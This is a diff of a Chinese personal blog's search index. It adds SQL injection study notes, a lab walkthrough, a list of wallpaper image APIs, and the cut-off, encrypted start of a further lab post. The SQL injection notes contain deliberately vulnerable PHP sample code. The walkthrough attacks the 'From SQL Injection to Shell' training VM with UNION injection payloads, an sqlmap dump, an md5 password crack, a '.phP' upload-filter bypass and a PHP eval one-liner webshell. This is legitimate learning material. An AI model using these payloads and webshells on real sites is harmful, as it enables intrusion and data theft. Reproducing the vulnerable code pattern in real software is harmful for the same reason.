@@ -1,6 +1,348 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>SQL注入漏洞（一）</title>
+    <url>/2022/02/16/SQL1/</url>
+    <content><![CDATA[<h1>SQL 注入漏洞简介</h1>
+<h2 id="SQL-注入漏洞产生原因及危害">SQL 注入漏洞产生原因及危害</h2>
+<p>SQL 注入漏洞是指攻击者通过浏览器或者其他客户端将恶意 SQL 语句插入到网站参数中,而网站应用程序末对其进行过滤,将恶意 SQL语句带入数据库使恶意 SQL 语句得以执行,从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。<br>
+SQL 注入漏洞可能会造成服务器的数据库信息泄露、数据被窃取、网页被篡改,甚至可能会造成网站被挂马、服务器被远程控制、被安装后门等。</p>
+<h2 id="SQL-注入漏洞示例代码分析">SQL 注入漏洞示例代码分析</h2>
+<p>以下是 SQL 注入漏洞的示例代码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql-"SELECT * FROM users WHBRE id=$id LIMIT O,1";</span><br><span class="line">$result=mysql_query(fsql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
+<p>中间件通过 <code>$_GET['id']</code> 获取用户输入的 id 参数的值,并赋值给<code>$id</code> 这个变量。<code>$id</code> 在后面没有经过任何过滤,直接拼接到 SQL 语句中,然后在数据库中执行了此 SQL 语句。<br>
+如果用户提交 <code>index.php?id=1 and 1=1</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>，会有正常的结果返回。<br>
+如果用户提交 <code>index.php?id=1 and 1=2</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>，会有不正常的结果返回。</p>
+<h2 id="SQL注入分类">SQL注入分类</h2>
+<p>SQL注入按照数据类型分为<span class="p red">数字型注入</span>和<span class="p red">字符型注入</span>。注入点的数据类型为数字型时为数字型注入,注入点的数据类型为字符型时为字符型注入。<br>
+SQL注入按照服务器返回信息是否显示分为报错注入和盲注。如果在注入的过程中,程序将获取的信息或者报错信息直接显示在页面中,这样的注入为报错注入;如果在注入的过程中,程序不显示任何SQL报错信息,只能通过精心构造SQL语句,根据页面是否正常返回或者返回的时间判断注入的结果,这样的注入为盲注。</p>
+<h1>数字型注入</h1>
+<p>数字型注入就是注入点的数据类型是数字型,没有用单引号引起来。数字型注入的典型示例代码如下:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";    //$id没有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
+<p>在 <code>WHERE id=$id</code>这个SQL语句的子句中,<code>$id</code>变量没有用单引号或者双引号引起来,而是直接拼接到了后面,这样的注入就是典型的数字型注入。</p>
+<h2 id="判断数字型注入的方法如下">判断数字型注入的方法如下:</h2>
+<h3 id="输入单引号-不正常返回。">输入单引号,不正常返回。</h3>
+<p>如果用户提交 <code>index.php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
+<h3 id="输入and-1-1-正常返回。">输入<code>and 1=1</code>,正常返回。</h3>
+<p>如果用户提交 <code>index.php?id=1 and 1=1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>,会有正常的结果返回。</p>
+<h3 id="输入and-1-2-不正常返回">输入<code>and 1=2</code>,不正常返回</h3>
+<p>如果用户提交 <code>index.php?id=1 and 1=2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>,会有不正常的结果返回。<br>
+数字型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在数字型注入。具体有没有数字型注入,是否可以通过数字型注入获取有效信息,还需要大量的测试来验证。</p>
+<h1>字符型注入</h1>
+<p>字符型注入就是注入点的数据类型是字符型。字符型注入与数字型注入的区别就是字符型注入要用一对单引号引起来。字符型注入的典型示例代码如下：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";    //'$id'有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
+<p>这个示例代码与数字型注入的示例代码基本一致,只是在后面的SQL语句拼接中,<code>$id</code>多了一对单引号,<code>$id</code>是字符型数据,这就是典型的字符型注入。</p>
+<h2 id="判断字符型注入的方法如下">判断字符型注入的方法如下:</h2>
+<h3 id="输入单引号-不正常返回。-v2">输入单引号,不正常返回。</h3>
+<p>如果用户提交 <code>index,php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
+<h3 id="输入-and-1-1-正常返回">输入<code>'and'1'='1</code>,正常返回</h3>
+<p>如果用户提交 <code>index.php?id=1 'and' 1'='1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='1' LIMIT 0,1</code>,会有正常的结果返回。</p>
+<h3 id="输入-and-1-2-不正常返回">输入<code>'and'1'='2</code>,不正常返回</h3>
+<p>如果用户提交 <code>index.php?id=1 'and' 1'='2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1</code>,会有不正常的结果返回。<br>
+字符型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在字符型注入。具体有没有字符型注入,是否可以通过字符型注入获取有效信息,还需要大量的测试来验证。</p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>My Awesome Photoblog靶机学习记录</title>
+    <url>/2022/08/08/Photoblog/</url>
+    <content><![CDATA[<h1>关于靶机</h1>
+<blockquote>
+<h2 id="破解渗透测试实验室：从-SQL-注入到-Shell-VM">破解渗透测试实验室：从 SQL 注入到 Shell VM</h2>
+<p>‎你好，朋友们！！今天，我们将解决另一个CTF挑战“从SQL注入到Shell I”。此 VM 由 Pentester Lab 开发。您可以从此处下载：<a href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/%E2%80%8E">https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/‎</a></p>
+<p>‎在 VM 软件中安装 iso 映像并启动它。本练习中给出的任务是访问管理控制台并上传 PHP Webshell。‎</p>
+<h3 id="水平">水平</h3>
+<p>‎初学者‎</p>
+<h3 id="说明">说明</h3>
+<p>‎本练习说明如何从 SQL 注入中获取对管理控制台的访问权限。然后在管理控制台中，了解如何在系统上运行命令。‎</p>
+<h3 id="‎你会学到什么？‎">‎你会学到什么？‎</h3>
+<ul>
+<li>‎使用 UNION 的 SQL 注入利用‎</li>
+<li>‎破解 md5 散列密码‎</li>
+<li>‎编写 PHP Webshell‎</li>
+</ul>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>PENTESTER LAB: FROM SQL INJECTION TO SHELL</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>发布日期</td>
+<td>2012年9月13日</td>
+</tr>
+<tr>
+<td>作者</td>
+<td>Pentester Lab</td>
+</tr>
+<tr>
+<td>系列</td>
+<td>Pentester Lab</td>
+</tr>
+<tr>
+<td>网页</td>
+<td><a href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/">https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/</a></td>
+</tr>
+</tbody>
+</table>
+<h1>环境</h1>
+<p>靶机：My Awesome Photoblog（IP:192.168.3.108）</p>
+<p>攻击机：KALI（IP:192.168.3.96）</p>
+<p>平台：VMware 16.2.4</p>
+<h1>信息收集</h1>
+<p><strong>主机发现</strong></p>
+<p><code>arp-scan -l</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182145.png" alt="QQ截图20220808182145"></p>
+<p><strong>使用nmap进行扫描主机</strong></p>
+<p><code>nmap -sS -Pn -A -p- -n 192.168.3.108</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182345.png" alt="QQ截图20220808182345"></p>
+<p><code>nmap -sV -p- 192.168.3.108</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182446.png" alt="QQ截图20220808182446"></p>
+<p><strong>web指纹识别</strong></p>
+<p><code>whatweb -v 192.168.3.108</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182618.png" alt="QQ截图20220808182618"></p>
+<p><strong>网站目录扫描</strong></p>
+<p><code>dirb http://192.168.3.108 /usr/share/dirb/wordlists/big.txt</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182855.png" alt="QQ截图20220808182855"></p>
+<p><strong>查看html代码</strong></p>
+<p>访问<code>http://192.168.3.108/</code>，<kbd>Ctrl</kbd>+<kbd>U</kbd>查看页面源代码：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194348.png" alt="QQ截图20220810194348"></p>
+<p>发现代码中有<code>cat.php?id=1</code>，疑似可以SQL注入。而<code>admin/uploads/</code>则可能是文件上传的路径。</p>
+<h2 id="收集到的信息：">收集到的信息：</h2>
+<ul>
+<li>IP =&gt; 192.168.3.108</li>
+<li>开放的端口：
+<ul>
+<li>22 =&gt; ssh服务 ---- OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)</li>
+<li>80 =&gt; http服务 ---- Apache httpd 2.2.16 ((Debian))</li>
+</ul>
+</li>
+<li>扫描出来的网站目录</li>
+<li>疑似可以SQL注入</li>
+<li>可能存在文件上传</li>
+</ul>
+<hr>
+<h1>渗透测试</h1>
+<div class="tip bolt"><p>首先尝试登陆后台，这里介绍两种方法：</p>
+</div>
+<h2 id="方法一：尝试进行SQL注入">方法一：尝试进行SQL注入</h2>
+<h3 id="判断是否可以注入：">判断是否可以注入：</h3>
+<p>构造url：</p>
+<p><code>192.168.3.108/cat.php?id=1 and 1=1#</code></p>
+<p>页面正常显示</p>
+<p><code>192.168.3.108/cat.php?id=1 and 1=2#</code></p>
+<p>页面不正常显示：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194602.png" alt="QQ截图20220810194602"></p>
+<p>结论：由此说明参数id存在sql注入。</p>
+<h3 id="判断列数">判断列数</h3>
+<p><code>192.168.3.108/cat.php?id=1 order by 1</code></p>
+<p><code>192.168.3.108/cat.php?id=1 order by 2</code></p>
+<p>…</p>
+<p><code>192.168.3.108/cat.php?id=1 order by 5</code></p>
+<p>此时发生报错：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194855.png" alt="QQ截图20220810194855"></p>
+<p>则得知列数为4。</p>
+<h3 id="联合查询获取数据库名称">联合查询获取数据库名称</h3>
+<p>判断显示的列位：</p>
+<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,2,3,4#</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194926.png" alt="QQ截图20220810194926"></p>
+<p>得知第二列为显示位。继续查询数据库名：</p>
+<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,database(),3,4#</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194952.png" alt="QQ截图20220810194952"></p>
+<p>得知数据库名为 <code>photoblog</code></p>
+<h3 id="联合查询遍历表名">联合查询遍历表名</h3>
+<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,table_name,3,4 from information_schema.tables#</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195115.png" alt="QQ截图20220810195115"></p>
+<p>发现有一个users表，可能是网站后台的账号密码。</p>
+<h3 id="查询users列名">查询users列名</h3>
+<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,column_name,3,4 from information_schema.columns where table_name = 'users'#</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195157.png" alt="QQ截图20220810195157"></p>
+<h3 id="查询users表数据">查询users表数据</h3>
+<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,login,3,4 from users#</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195228.png" alt="QQ截图20220810195228"></p>
+<p>得到后台管理员用户名 ：</p>
+<blockquote>
+<p>admin</p>
+</blockquote>
+<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,password,3,4 from users#</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195317.png" alt="QQ截图20220810195317"></p>
+<p>得到密文：</p>
+<blockquote>
+<p>8efe310f9ab3efeae8d410a8e0166eb2</p>
+</blockquote>
+<p>长度为32，猜测为md5加密，在<a href="https://www.cmd5.com/">cmd5</a>网站解密：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195632.png" alt="QQ截图20220810195632"></p>
+<p>得到密码：</p>
+<blockquote>
+<p>P4ssw0rd</p>
+</blockquote>
+<h3 id="登录后台">登录后台</h3>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195712.png" alt="QQ截图20220810195712"></p>
+<h2 id="方法二-：使用sqlmap">方法二 ：使用sqlmap</h2>
+<p>因为网页的标题是“My Awesome Photoblog”，可以猜测数据库名称为<code>photoblog</code>（在方法一中证明）</p>
+<p>使用sqlmap获取该数据库的全部数据：</p>
+<p><code>sqlmap –u http://192.168.3.108/cat.php?id=1 –D photoblog --dump-all --batch</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810200042.png" alt="QQ截图20220810200042"></p>
+<p>直接获得了账户名和登录密码：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810200117.png" alt="QQ截图20220810200117"></p>
+<hr>
+<div class="tip bolt"><p>接下来getshell，这里介绍两种方法：</p>
+</div>
+<h2 id="方法一：一句话木马-蚁剑连接">方法一：一句话木马+蚁剑连接</h2>
+<p>构造一句话木马<code>yijuhua.php</code>并上传， 发现提示不允许上传php。进行一下简单的文件上传绕过，修改后缀为<code>.phP</code>，成功上传。</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810200441.png" alt="QQ截图20220810200441"></p>
+<p>蚁剑连接：</p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810201802.png" alt="QQ截图20220810201802"></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810202139.png" alt="QQ截图20220810202139"></p>
+<p>成功getshell！</p>
+<h2 id="方法二-：weevely-php菜刀-连接">方法二 ：weevely(php菜刀)连接</h2>
+<p>使用kali中的工具weevely，生成一个webshell文件：</p>
+<p><code>weevely generate hacker shell.php</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810202446.png" alt="QQ截图20220810202446"></p>
+<p>修改后缀为<code>.phP</code>进行文件上传，然后使用weevely连接webshell：</p>
+<p><code>weevely http://192.168.0.131/admin/uploads/shell.PHP hacker</code></p>
+<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810202826.png" alt="QQ截图20220810202826"></p>
+<p>成功连接。</p>
+<details class="folding-tag" cyan="" close=""><summary> 参考文章： </summary>
+              <div class="content">
+              <div class="tag link"><a class="link-card" title="Hack the Pentester Lab: from SQL injection to Shell VM" href="https://www.hackingarticles.in/hack-pentester-lab-sql-injection-shell-vm/"><div class="left"><img src="https://img.anineg.space/logo-white.png"></div><div class="right"><p class="text">Hack the Pentester Lab: from SQL injection to Shell VM</p><p class="url">https://www.hackingarticles.in/hack-pentester-lab-sql-injection-shell-vm/</p></div></a></div><div class="tag link"><a class="link-card" title="My Awesome Photoblog靶机渗透WP" href="https://www.jianshu.com/p/dd8768dd2b58"><div class="left"><img src="https://img.anineg.space/logo-white.png"></div><div class="right"><p class="text">My Awesome Photoblog靶机渗透WP</p><p class="url">https://www.jianshu.com/p/dd8768dd2b58</p></div></a></div>
+              </div>
+            </details>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>靶机</tag>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>随机背景API接口整理</title>
+    <url>/2022/03/20/backgroundAPI/</url>
+    <content><![CDATA[<h1>废话不多说，上图！（每次刷新都不一样哦~）</h1>
+<p>（API链接在后面）</p>
+<p><img src="https://api.mtyqx.cn/api/random.php" alt=""></p>
+<p><img src="https://api.mtyqx.cn/tapi/random.php" alt=""></p>
+<p><img src="https://api.ixiaowai.cn/api/api.php" alt=""></p>
+<p><img src="https://api.ixiaowai.cn/mcapi/mcapi.php" alt=""></p>
+<p><img src="https://acg.toubiec.cn/random.php" alt=""></p>
+<p><img src="https://www.dmoe.cc/random.php" alt=""></p>
+<p><img src="https://api.paugram.com/wallpaper/?source=sina&amp;category=us" alt=""></p>
+<h1>API接口链接</h1>
+<h2 id="必应壁纸">必应壁纸</h2>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.dujin.org/bing/1366.php (1366*768)</span><br><span class="line">https://api.dujin.org/bing/1920.php (1920*1080)</span><br><span class="line">https://api.dujin.org/bing/m.php    (1080*1920)</span><br><span class="line">//api.timecdn.cn/libs/wallpaper/v1  (1920*1080)</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="http://api.timecdn.cn/libs/wallpaper/v1" alt=""></p>
+<center>今日必应壁纸</center>
+<h2 id="野生动漫-API">野生动漫 API</h2>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.mtyqx.cn/api/random.php</span><br><span class="line">https://api.mtyqx.cn/tapi/random.php</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="系列-API（需自己按照网站说明调用-API-参数）">系列 API（需自己按照网站说明调用 API 参数）</h2>
+<blockquote>
+<p>小歪 API</p>
+<p><a href="https://api.ixiaowai.cn/">https://api.ixiaowai.cn</a></p>
+</blockquote>
+<blockquote>
+<p>未知名称动漫 API</p>
+<p><a href="https://acg.toubiec.cn/">https://acg.toubiec.cn</a></p>
+</blockquote>
+<blockquote>
+<p>樱花 API</p>
+<p><a href="http://www.dmoe.cc/">http://www.dmoe.cc/</a></p>
+</blockquote>
+<blockquote>
+<p>岁月小筑随机背景 API</p>
+<p><a href="https://img.xjh.me/">https://img.xjh.me</a></p>
+</blockquote>
+<blockquote>
+<p>保罗 API</p>
+<p><a href="https://api.paugram.com/help/wallpaper/">https://api.paugram.com/help/wallpaper/</a></p>
+</blockquote>
+<blockquote>
+<p>樱道随机图片</p>
+<p><a href="https://img.r10086.com/">https://img.r10086.com/</a></p>
+</blockquote>
+<blockquote>
+<p>墨天逸</p>
+<p><a href="http://api.mtyqx.cn/">http://api.mtyqx.cn</a></p>
+</blockquote>
+<blockquote>
+<p>Unsplash</p>
+<p><a href="https://source.unsplash.com/">https://source.unsplash.com/</a></p>
+</blockquote>
+<blockquote>
+<p>后宫漫图：</p>
+<p><a href="https://acg.sx/images">https://acg.sx/images</a></p>
+</blockquote>
+<blockquote>
+<p>EEEDOG</p>
+<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
+</blockquote>
+<blockquote>
+<p>东方 Project</p>
+<p><a href="https://img.paulzzh.tech/">https://img.paulzzh.tech/</a></p>
+</blockquote>
+<blockquote>
+<p>搏天 API</p>
+<p><a href="https://api.btstu.cn/doc/sjbz.php">https://api.btstu.cn/doc/sjbz.php</a></p>
+</blockquote>
+<blockquote>
+<p>汐岑 ACG</p>
+<p><a href="https://acg.yanwz.cn/">https://acg.yanwz.cn</a></p>
+</blockquote>
+<blockquote>
+<p>凌一 API</p>
+<p><a href="https://api.lyiqk.cn/">https://api.lyiqk.cn</a></p>
+</blockquote>
+<blockquote>
+<p>Lorem Picsum</p>
+<p><a href="https://picsum.photos/">https://picsum.photos/</a></p>
+</blockquote>
+<blockquote>
+<p>API 接口文档 - 夏沫博客</p>
+<p><a href="https://cdn.seovx.com/">https://cdn.seovx.com/</a></p>
+</blockquote>
+<blockquote>
+<p>Ushio API</p>
+<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
+</blockquote>
+<blockquote>
+<p>点滴 API</p>
+<p><a href="https://api.ddkjt.com/">https://api.ddkjt.com/</a></p>
+</blockquote>
+<blockquote>
+<p>Langford’s API</p>
+<p><a href="https://api.ucany.net/">https://api.ucany.net/</a></p>
+</blockquote>
+<blockquote>
+<p>一铭 API</p>
+<p><a href="https://api.wer.plus/product/doc?id=2">https://api.wer.plus/product/doc?id=2</a></p>
+<p><a href="https://api.wer.plus/product/doc?id=3">https://api.wer.plus/product/doc?id=3</a></p>
+</blockquote>
+<blockquote>
+<p>R0A1NG’s API<br>
+<a href="https://api.roaing.com/#/doc/dongmanimg">https://api.roaing.com/#/doc/dongmanimg</a></p>
+</blockquote>
+<blockquote>
+<p>JacksonXE の API<br>
+<a href="https://api.jacksonxe.cn/api/file/random?sole=">https://api.jacksonxe.cn/api/file/random?sole=</a></p>
+</blockquote>
+<div class="tag link"><a class="link-card" title="随机壁纸API整理" href="https://quest.myxxts.club/archives/54/"><div class="left"><img src="https://sdn.geekzu.org/avatar/b78149ae3a65c308a991d61840da7225?s=&amp;r=&amp;d="></div><div class="right"><p class="text">随机壁纸API整理</p><p class="url">https://quest.myxxts.club/archives/54/</p></div></a></div>
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Metasploitable2靶机学习记录</title>
     <url>/2022/10/02/Metasploitable2/</url>
     <content><![CDATA[<h1>关于Metasploitable2</h1>
@@ -201,346 +543,27 @@
       </tags>
   </entry>
   <entry>
-    <title>My Awesome Photoblog靶机学习记录</title>
-    <url>/2022/08/08/Photoblog/</url>
-    <content><![CDATA[<h1>关于靶机</h1>
-<blockquote>
-<h2 id="破解渗透测试实验室：从-SQL-注入到-Shell-VM">破解渗透测试实验室：从 SQL 注入到 Shell VM</h2>
-<p>‎你好，朋友们！！今天，我们将解决另一个CTF挑战“从SQL注入到Shell I”。此 VM 由 Pentester Lab 开发。您可以从此处下载：<a href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/%E2%80%8E">https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/‎</a></p>
-<p>‎在 VM 软件中安装 iso 映像并启动它。本练习中给出的任务是访问管理控制台并上传 PHP Webshell。‎</p>
-<h3 id="水平">水平</h3>
-<p>‎初学者‎</p>
-<h3 id="说明">说明</h3>
-<p>‎本练习说明如何从 SQL 注入中获取对管理控制台的访问权限。然后在管理控制台中，了解如何在系统上运行命令。‎</p>
-<h3 id="‎你会学到什么？‎">‎你会学到什么？‎</h3>
-<ul>
-<li>‎使用 UNION 的 SQL 注入利用‎</li>
-<li>‎破解 md5 散列密码‎</li>
-<li>‎编写 PHP Webshell‎</li>
-</ul>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>PENTESTER LAB: FROM SQL INJECTION TO SHELL</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>发布日期</td>
-<td>2012年9月13日</td>
-</tr>
-<tr>
-<td>作者</td>
-<td>Pentester Lab</td>
-</tr>
-<tr>
-<td>系列</td>
-<td>Pentester Lab</td>
-</tr>
-<tr>
-<td>网页</td>
-<td><a href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/">https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/</a></td>
-</tr>
-</tbody>
-</table>
-<h1>环境</h1>
-<p>靶机：My Awesome Photoblog（IP:192.168.3.108）</p>
-<p>攻击机：KALI（IP:192.168.3.96）</p>
-<p>平台：VMware 16.2.4</p>
-<h1>信息收集</h1>
-<p><strong>主机发现</strong></p>
-<p><code>arp-scan -l</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182145.png" alt="QQ截图20220808182145"></p>
-<p><strong>使用nmap进行扫描主机</strong></p>
-<p><code>nmap -sS -Pn -A -p- -n 192.168.3.108</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182345.png" alt="QQ截图20220808182345"></p>
-<p><code>nmap -sV -p- 192.168.3.108</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182446.png" alt="QQ截图20220808182446"></p>
-<p><strong>web指纹识别</strong></p>
-<p><code>whatweb -v 192.168.3.108</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182618.png" alt="QQ截图20220808182618"></p>
-<p><strong>网站目录扫描</strong></p>
-<p><code>dirb http://192.168.3.108 /usr/share/dirb/wordlists/big.txt</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182855.png" alt="QQ截图20220808182855"></p>
-<p><strong>查看html代码</strong></p>
-<p>访问<code>http://192.168.3.108/</code>，<kbd>Ctrl</kbd>+<kbd>U</kbd>查看页面源代码：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194348.png" alt="QQ截图20220810194348"></p>
-<p>发现代码中有<code>cat.php?id=1</code>，疑似可以SQL注入。而<code>admin/uploads/</code>则可能是文件上传的路径。</p>
-<h2 id="收集到的信息：">收集到的信息：</h2>
-<ul>
-<li>IP =&gt; 192.168.3.108</li>
-<li>开放的端口：
-<ul>
-<li>22 =&gt; ssh服务 ---- OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)</li>
-<li>80 =&gt; http服务 ---- Apache httpd 2.2.16 ((Debian))</li>
-</ul>
-</li>
-<li>扫描出来的网站目录</li>
-<li>疑似可以SQL注入</li>
-<li>可能存在文件上传</li>
-</ul>
-<hr>
-<h1>渗透测试</h1>
-<div class="tip bolt"><p>首先尝试登陆后台，这里介绍两种方法：</p>
+    <title>VulnHub——DC-1靶机学习记录</title>
+    <url>/2022/09/24/dc1/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="84e5950b4f6928370c633f0f1a1812ee8067963b5a6d847c60c774e437edb9fb">bed7a276ba7847d76277538a14c701d513208fcd9bec01ee5395d46614c8a8d77a7487d3838d985e6244ba9499c43727f0817a7c1d48622c8c2bfb7b6a8aba9bebac452a3380872edb394f4ce5260c0b543356768910e99ec6ced4db139df77114896906cb314cd3d31b36bd2e2976fdaf780288d9be00c3207d30101f1ba4c6f0247443ff05f8fa65f91ea64bda0236e442d53cd761dd272e7adda3365808d99fe2c4ce47eb10db32512dc5eaa5efc39976d5e25393539c4d229126208ff59e2f615950e2aefdd8cbc9f76f06e5e19194ad1b525da4b6b98b49926d2f2eadfdf5194511986954bdff328871779b0cc3cc29726bf67cd4edba7dd4255f4a85807fea077ae7864bd950ceae3e55754fb9e7c7ec1314910fb83de0555b86db174ef824a5f8bb31f5dca1526a2b87c71ec7552ee2315a43200aa81a2adb5c8b8e0f6e1eac168c661f47c022ba89ad53cfd7ad21bdf518191e7c4bfa96de18129935da0781be88c84f6e97ce0269827eab9d6a08637ec05b52fbb34b67fc559fff245868ab8078132a6a60992a6442e0b411797a40210b2a47780649dc235bb06738b3f985a16fc31899f08c61b8a28e3ad4f8ac24c49c6885a597ff0e19513152d799b8588e23bca1659877a692363826a0ec08eed5306ae1a75befa4238c00283cdb3ab6d0f4a271ed814c2717e922325c27289dccea8d3a40699f71da3d13ecd90f833910705db6f4839585c25f2249a9d659ca01ff137c03e4672114165e380f391272148d6a652204e71d1f0b4be43c9a0aeebacd4baf7605777c8db316d2b2d76b1948fb821ae5edc3a799142616788d1df1ae847432bb2fd382176d6f1d5d833568aeaea6461b5a2aa47cda200425f2de7944a898576a6603a880137e300b8a229734e593d710738521e8c66804853557ba6a6804b3f09a8633a590887abcf827d2f4e0b44c676a1f37404bcdd5d27bf550b5f78d29eb8718bb51f74577511cfd8ad9ad556af306e49195f2d49eaf474c027084376ce24c0caddf9b7d14d24b8c08651451e0732cf38d1635bb27dd7591a830a795dbf2df83a71e594e6d113cb3745ef89696c7b566af22b7c356cae5f5768f56ba5ee64760b5d820194656db02bc7602d9920025f8cc09d0a58480661a3acee7f6b80f2d9a6bfe08f14e4b69826177422737797526c8adc69efb376865edaa30243adf7a808f04f0d9e008a6f5ae66bdca6ea3f27f4ddc03c15c54920dc3043eb92c3a2c61f282adf2